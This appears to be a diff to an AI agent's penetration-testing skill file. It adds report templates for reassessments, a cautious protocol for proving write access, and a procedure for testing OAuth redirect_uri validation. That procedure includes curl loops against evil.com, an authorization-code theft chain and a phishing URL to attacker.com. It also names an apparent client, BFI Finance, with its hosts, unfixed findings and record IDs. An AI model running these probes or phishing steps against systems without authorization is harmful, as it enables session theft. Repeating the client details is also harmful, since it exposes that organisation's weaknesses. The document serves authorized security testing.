@@ -1,13 +1,12 @@
 ---
 name: ptest
 description: "Structured penetration testing framework with gated phases. Guides methodical progression from recon through exploitation to reporting."
-version: 4.0.0
+version: 4.1.0
 author: n4igme
 license: MIT
 argument-hint: "<command: start|preflight|status|resume|next|escalate|cleanup|recon-passive|recon-active|enumerate|attack-surface|vuln-assess|exploit|post-exploit|report>"
 metadata:
   hermes:
-    tags: [pentest, penetration-testing, security, recon, exploitation, post-exploitation, red-teaming, offensive-security]
     tags: [pentest, penetration-testing, security, recon, exploitation, post-exploitation, red-teaming, offensive-security]
     related_skills: [godmode, parse-finding, mtest, scode]
 ---
@@ -271,6 +270,7 @@ When generating phase checklists during `start`, filter techniques by scope type
 | 5 | Threat Modeling | Y | Y | Y | Y | Y |
 | 5 | Nuclei Scan (MANDATORY) | Y | N | Y | N | Y |
 | 5 | CORS Origin Reflection Testing (MANDATORY) | Y | N | Y | N | Y |
+| 5 | OAuth/OIDC redirect_uri Validation (MANDATORY) | Y | N | Y | N | Y |
 | 5 | Nikto Scan | Y | N | N | N | Y |
 | 5 | SSL/TLS Assessment | Y | Y | Y | N | Y |
 | 5 | CVE Mapping | Y | Y | Y | Y | Y |
@@ -390,8 +390,6 @@ For time-boxed engagements, use these guidelines to avoid over-investing in earl
 | 8 Reporting | 10% | Write-up (findings documented throughout) |
 
 Adjust based on scope size. Large scope (50+ hosts) → more recon time. Small scope (single app) → more exploitation time.
-
-**Continuous/internal engagements:** When the operator is a full-time internal pentester (no time-box), set `time_budget.mode: "continuous"` in state.yaml. Track time spent for reporting purposes only — no budget enforcement. The effort allocation percentages still guide sequencing priority but don't trigger over-budget alerts.
 
 **Continuous/internal engagements:** When the operator is a full-time internal pentester (no time-box), set `time_budget.mode: "continuous"` in state.yaml. Track time spent for reporting purposes only — no budget enforcement. The effort allocation percentages still guide sequencing priority but don't trigger over-budget alerts.
 
@@ -612,6 +610,103 @@ The final report should follow this structure. Adapt sections based on engagemen
 - Final recommendation
 ```
 
+### Reassessment/Redo Report Adaptations
+
+When the engagement is a reassessment (redo) of previously reported findings, adapt the report structure:
+
+**Additional/modified sections:**
+
+```markdown
+## 0. Fix Verification Summary (INSERT BEFORE Executive Summary)
+
+### Remediation Effectiveness
+
+| Metric | Value |
+|--------|-------|
+| Round 1 findings | {n} |
+| Fully fixed | {n} ({%}) |
+| Partially fixed | {n} ({%}) |
+| Unfixed | {n} ({%}) |
+| **Remediation effectiveness** | **{%}** |
+| Time since Round 1 report | {days/weeks} |
+
+### Fix Verification Matrix
+
+| R1 ID | Title | Severity | Gateway/Path Tested | Status | Notes |
+|-------|-------|----------|--------------------:|--------|-------|
+| F-1 | {title} | Critical | microservices.prod.bfi.co.id | ✅ Fixed | Returns 401 |
+| F-1 | {title} | Critical | microservices.prod.bravo.bfi.co.id | ❌ Unfixed | Still returns 200 |
+
+### Key Observations
+
+- {Pattern observation, e.g., "Fixes applied to 1 of 4 gateways only"}
+- {Root cause, e.g., "Configuration drift between gateway variants"}
+- {Positive note if any, e.g., "JWT validation logic properly implemented on primary gateway"}
+```
+
+**Modified Executive Summary:**
+```markdown
+## 1. Executive Summary
+
+### Remediation Status
+- **{n}/{total} findings fixed** from Round 1 ({%} remediation rate)
+- **{n} new findings** discovered in Round 2
+- **{total} active vulnerabilities** across the estate
+
+### Key Findings (combine old + new)
+
+| Category | Count |
+|----------|-------|
+| Unfixed Critical (Round 1) | {n} |
+| Unfixed High (Round 1) | {n} |
+| New Critical (Round 2) | {n} |
+| New High (Round 2) | {n} |
+| **Total Active** | **{n}** |
+```
+
+**Modified Findings Summary (Section 4):**
+```markdown
+## 4. Findings Summary
+
+### Unfixed Round 1 Findings
+
+| R1 ID | Title | Severity | Status | Notes |
+|-------|-------|----------|--------|-------|
+| F-1 | {title} | Critical | ❌ Still vulnerable | {brief note} |
+
+**Summary: {n}/{total} fixed. {n} partially fixed. {n} still vulnerable.**
+
+### New Findings (Round 2)
+
+| ID | Title | Severity | CVSS | Asset |
+|----|-------|----------|------|-------|
+| F-1 | {title} | Critical | 9.1 | {asset} |
+```
+
+**Additional Appendix:**
+```markdown
+## Appendix: Fix Verification Details
+
+For each Round 1 finding, document:
+1. Original PoC replayed verbatim
+2. All gateways/paths tested (not just the primary)
+3. Adjacent endpoints checked
+4. Current response vs Round 1 response
+
+| R1 Finding | Test Performed | Expected (if fixed) | Actual | Verdict |
+|-----------|---------------|---------------------|--------|---------|
+| F-1 GET | curl -sk $URL/master/v1/general | 401 | 200 (4199 records) | UNFIXED |
+| F-1 POST | curl -sk -X POST $URL/master/v1/general -d '...' | 401 | 200 (created ID 5668) | UNFIXED |
+```
+
+**Framing guidance for reassessments:**
+- Lead with remediation effectiveness — this is what stakeholders care about most
+- Frame unfixed findings as "remediation failure" not just "vulnerability exists"
+- Highlight patterns (e.g., "all fixes applied to one gateway only" = systemic deployment issue)
+- Note positive progress even if incomplete (e.g., "primary gateway secured, parallel paths missed")
+- Include a "Remediation Process Recommendations" section addressing WHY fixes failed, not just WHAT to fix
+- Calculate risk delta: is the organization MORE or LESS secure than Round 1? (can be worse if new findings outweigh fixes)
+
 ### CVSS Scoring Guidance for Financial Services
 
 For targets in financial services (banking, multi-finance, insurance), consider upgrading severity when:
@@ -696,7 +791,79 @@ done
 - [ ] Test PATCH on all unauthenticated GET endpoints with `/{id}` suffix
 - [ ] Test PUT on all unauthenticated GET endpoints with `/{id}` suffix
 - [ ] Test DELETE on all unauthenticated GET endpoints with `/{id}` suffix
-- [ ] If write succeeds: immediately revert, document evidence, escalate
+- [ ] If write succeeds: follow Write Access Response Protocol below
+
+### Write Access Response Protocol
+
+When write access (POST/PUT/PATCH/DELETE) succeeds on an unauthenticated endpoint, follow this decision tree:
+
+```
+Write Access Confirmed
+├── Is this PRODUCTION?
+│   ├── YES → Minimize impact. ONE record is sufficient proof.
+│   │   ├── Use obviously-fake data: {"name":"PENTEST-PROBE-DELETE","code":"PT-DELETE"}
+│   │   ├── Do NOT test PATCH/PUT on existing records (risk of corrupting real data)
+│   │   ├── Prove PATCH exists without corrupting: test on the record YOU just created
+│   │   └── Document record ID immediately for client cleanup
+│   └── NO (nonprod) → More latitude, but still document for cleanup
+│
+├── Can you DELETE the test record?
+│   ├── YES → Delete immediately, screenshot before/after as evidence
+│   └── NO (no DELETE endpoint or DELETE returns 405/403)
+│       ├── Can you PATCH it to a flagged state?
+│       │   ├── YES → PATCH name to "PENTEST-DELETE-ME-{date}" so client can find it
+│       │   └── NO → Leave as-is, document in cleanup appendix
+│       └── Add to "Test Records Created" cleanup table
+│
+├── Is the write DESTRUCTIVE? (overwrites/deletes existing data)
+│   ├── YES → DO NOT EXECUTE on real records
+│   │   ├── Prove the method is accepted: send request with empty/malformed body
+│   │   ├── Document: "PUT /resource/1 returns 400 (bad body) not 401/405 — write method accepted"
+│   │   ├── Or: test on YOUR created record only
+│   │   └── This is sufficient evidence without corrupting production data
+│   └── NO (creates new record) → Safe to execute once as proof
+│
+└── Documentation requirements:
+    ├── Screenshot/save the response showing successful write
+    ├── Record the exact ID/key of created records
+    ├── Add to report "Appendix: Test Records (Client Cleanup Required)"
+    ├── Format: | Environment | Endpoint | Record ID | Data Written | Action Needed |
+    └── Notify client in debrief that cleanup is needed
+```
+
+**Test payload conventions:**
+- Always use obviously-fake data that's easy to find and delete
+- Include "PENTEST" or "DELETE-ME" in the name/description field
+- Use code/identifier like "PT-{date}" (e.g., "PT-20260521")
+- Never use real-looking data that could be confused with legitimate records
+- Never write offensive/inappropriate content (it's production)
+
+**Proving write without writing (when risk is too high):**
+```bash
+# Method 1: OPTIONS check
+curl -sk -X OPTIONS "$ENDPOINT" -D- | grep "Allow:"
+# If Allow: GET, POST, PUT, DELETE → methods accepted
+
+# Method 2: Empty body (triggers 400, not 401/405)
+curl -sk -X POST "$ENDPOINT" -H "Content-Type: application/json" -d '{}' -w "[%{http_code}]"
+# 400 = endpoint accepts POST but body is invalid (PROVES write access exists)
+# 401/403 = auth required (safe)
+# 405 = method not allowed (safe)
+
+# Method 3: Invalid content-type (triggers 415, not 401)
+curl -sk -X POST "$ENDPOINT" -H "Content-Type: text/plain" -d 'test' -w "[%{http_code}]"
+# 415 = Unsupported Media Type (PROVES endpoint processes POST requests)
+```
+
+**Cleanup appendix format (add to report):**
+```markdown
+## Appendix: Test Records Created (Client Cleanup Required)
+
+| # | Environment | Endpoint | Record ID | Data Written | Date | Action |
+|---|-------------|----------|-----------|-------------|------|--------|
+| 1 | PROD | /master/v1/general | 5668 | {"name":"PENTEST-PROBE","code":"PT"} | 2026-05-21 | DELETE |
+| 2 | SIT | /master/v1/general | 8078 | {"name":"PENTEST-PROBE","code":"PT"} | 2026-05-21 | DELETE |
+```
 
 ### Fix Verification (Redo/Reassessment Engagements)
 
@@ -779,10 +946,6 @@ When a Keycloak token endpoint is found:
    curl -X POST "$KEYCLOAK_URL/protocol/openid-connect/token/introspect" \
      -d "token=$TOKEN&client_id=admin-cli"
    ```
-
-### WAF/Ingress Bypass Techniques
-
-When WAF blocks sensitive paths (actuator, swagger, admin), try these in order:
 
 ### CORS Origin Reflection Testing (MANDATORY Phase 5)
 
@@ -899,6 +1062,130 @@ https://blog.target.com/search?q=<script>
 ```
 
 This upgrades a "Low" reflected XSS on a blog to a "Critical" account takeover on the main API.
+
+### OAuth/OIDC redirect_uri Validation Testing (MANDATORY Phase 5/6)
+
+**Why mandatory:** Open redirect on OAuth authorization endpoints is a standalone Critical finding for any application using OAuth/OIDC. It enables authorization code theft without any other vulnerability — the attacker gets a valid token after the victim authenticates legitimately. The URL starts with the legitimate domain (passes email filters and user suspicion), making it a high-success-rate phishing vector.
+
+**Real-world example (BFI Finance, May 2026):**
+- All Keycloak public clients (los-operation, los-surveyor, admin-cli, account) accepted ANY redirect_uri
+- No PKCE required — authorization code directly exchangeable for JWT
+- No client_secret needed (public client) — attacker only needs the stolen code
+- Result: CVSS 8.1 Critical — any employee who clicks a link loses their session to the attacker
+
+**Procedure (run on ALL OAuth/OIDC authorization endpoints discovered in Phases 1-5):**
+
+**Step 1: Discover authorization endpoints**
+```bash
+# From .well-known discovery
+curl -sk "https://target/realms/REALM/.well-known/openid-configuration" | jq '.authorization_endpoint'
+curl -sk "https://target/.well-known/openid-configuration" | jq '.authorization_endpoint'
+
+# Common paths to try
+AUTHZ_PATHS=(
+  "/realms/{realm}/protocol/openid-connect/auth"   # Keycloak
+  "/oauth/authorize"                                 # Generic
+  "/oauth2/authorize"                                # AWS Cognito
+  "/authorize"                                       # Auth0
+  "/connect/authorize"                               # IdentityServer
+)
+```
+
+**Step 2: Enumerate clients**
+```bash
+# Known defaults (always try these)
+CLIENTS=("admin-cli" "account" "public-client")
+
+# Extract from JS bundles (found in Phase 3)
+grep -roh 'clientId["\s:=]*["'"'"']\([^"'"'"']*\)' ./ptest-output/enumeration/ | sort -u
+
+# Try application-specific names
+CLIENTS+=("los-operation" "los-surveyor" "dashboard" "mobile-app" "web-app")
+```
+
+**Step 3: Test redirect_uri variations**
+```bash
+AUTH_ENDPOINT="https://target/realms/REALM/protocol/openid-connect/auth"
+
+for CLIENT in "${CLIENTS[@]}"; do
+  echo "=== Client: $CLIENT ==="
+  for redirect in \
+    "https://evil.com" \
+    "https://legitimate.com.evil.com" \
+    "https://legitimate.com@evil.com" \
+    "https://evil.com/legitimate.com" \
+    "http://legitimate.com" \
+    "https://legitimate.com%0d%0a" \
+    "https://legitimate.com/../evil.com" \
+    "https://evil.com#legitimate.com"; do
+    
+    RESP=$(curl -sk -o /dev/null -w "%{http_code}:%{redirect_url}" \
+      "$AUTH_ENDPOINT?client_id=$CLIENT&redirect_uri=$redirect&response_type=code&scope=openid")
+    CODE=$(echo $RESP | cut -d: -f1)
+    echo "  redirect_uri=$redirect → $CODE"
+  done
+done
+```
+
+**Step 4: Interpretation**
+
+| Response | Meaning | Severity |
+|----------|---------|----------|
+| 302 → login page (or 200 login form) | redirect_uri ACCEPTED — will be used after auth | **Critical** |
+| 400 + "Invalid redirect_uri" | Properly validated — this redirect is rejected | Safe |
+| 400 + "Invalid client" / "Client not found" | Client doesn't exist — try others | N/A |
+| 302 → error page with "redirect_uri mismatch" | Validated but shows error | Safe |
+
+**Key distinction:** If the server shows a login page (not an error), the redirect_uri is accepted and WILL be used to redirect the authorization code after successful authentication. This is the critical indicator.
+
+**Step 5: Confirm exploitability (if redirect_uri accepted)**
+```bash
+# Check if client is public (no secret needed for code exchange)
+curl -sk -X POST "$TOKEN_ENDPOINT" \
+  -d "grant_type=authorization_code&code=FAKE&client_id=$CLIENT&redirect_uri=https://evil.com"
+# "Invalid authorization code" = public client (no secret required!) → CRITICAL
+# "Missing client_secret" = confidential client → still High (secret may be leaked elsewhere)
+
+# Check if PKCE is required
+curl -sk "$AUTH_ENDPOINT?client_id=$CLIENT&redirect_uri=https://evil.com&response_type=code&scope=openid"
+# If login page shows WITHOUT code_challenge parameter → PKCE not enforced → code directly usable
+
+# Check MFA enforcement
+# If Google Workspace SSO: MFA depends on Google org policy, not Keycloak
+# If Keycloak local auth: check if OTP is required (try password grant to confirm)
+```
+
+**Step 6: Document the full attack chain**
+```markdown
+Attack Chain:
+1. Attacker crafts URL: {authorization_endpoint}?client_id={public_client}&redirect_uri=https://evil.com/steal&response_type=code&scope=openid
+2. Victim clicks link → sees legitimate login page (domain is trusted)
+3. Victim authenticates (Google SSO / username+password)
+4. Keycloak redirects to: https://evil.com/steal?code=AUTH_CODE&session_state=...
+5. Attacker exchanges code: POST /token grant_type=authorization_code&code=AUTH_CODE&client_id={client}&redirect_uri=https://evil.com/steal
+6. Attacker receives: {"access_token":"eyJ...","refresh_token":"...","token_type":"bearer"}
+7. Attacker accesses all services the victim can access
+```
+
+**PoC phishing URL template (include in finding):**
+```
+https://{auth-domain}/realms/{realm}/protocol/openid-connect/auth?client_id={public-client}&redirect_uri=https%3A%2F%2Fattacker.com%2Fsteal&response_type=code&scope=openid&state=random123
+```
+
+**Checklist (add to Phase 5/6):**
+- [ ] Discover all OAuth/OIDC authorization endpoints (.well-known)
+- [ ] Enumerate all client_ids (defaults + JS bundle extraction)
+- [ ] Test arbitrary redirect_uri on each client
+- [ ] If accepted: confirm client is public (no secret for code exchange)
+- [ ] If accepted: confirm PKCE is NOT required
+- [ ] If accepted: document full attack chain with PoC URL
+- [ ] Test on ALL Keycloak instances/realms (prod, nonprod, all gateways)
+
+**Severity guidance:**
+- Public client + no redirect_uri validation + no PKCE = **Critical (8.1+)**
+- Confidential client + no redirect_uri validation = **High (7.1)** (secret may be leaked)
+- redirect_uri accepts subdomain variations only (e.g., *.legitimate.com) = **Medium (5.4)** (requires subdomain takeover)
+- PKCE enforced but redirect_uri open = **Medium (4.7)** (code unusable without verifier, but still an open redirect)
 
 ### WAF/Ingress Bypass Techniques (Conditional)
 
